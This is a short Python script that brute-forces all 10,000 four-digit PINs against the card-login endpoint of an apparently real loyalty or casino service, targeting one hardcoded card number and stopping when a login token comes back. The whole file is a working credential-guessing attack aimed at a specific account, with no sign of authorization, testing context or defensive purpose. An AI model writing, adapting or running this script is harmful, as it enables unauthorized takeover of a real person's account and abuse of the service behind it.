import requests

card_number = "105369918"
url = "https://nuggetsparks.joingo.com/rest-auth/card-login"

headers = {
    "User-Agent": "Mozilla/5.0",
    "Content-Type": "application/json"
}

for pin in range(10000):
    pin_str = f"{pin:04d}"
    data = {
        "cardNumber": card_number,
        "pin": pin_str
    }

    try:
        print(f"Trying PIN: {pin_str}")
        response = requests.post(url, json=data, headers=headers)
        print(f"Status Code: {response.status_code}")
        print(f"Response: {response.text[:200]}")  # Print only first 200 chars

        if response.status_code == 200 and "token" in response.text:
            print(f"[SUCCESS] PIN: {pin_str}")
            break
    except Exception as e:
        print(f"[ERROR] PIN: {pin_str} --> {e}")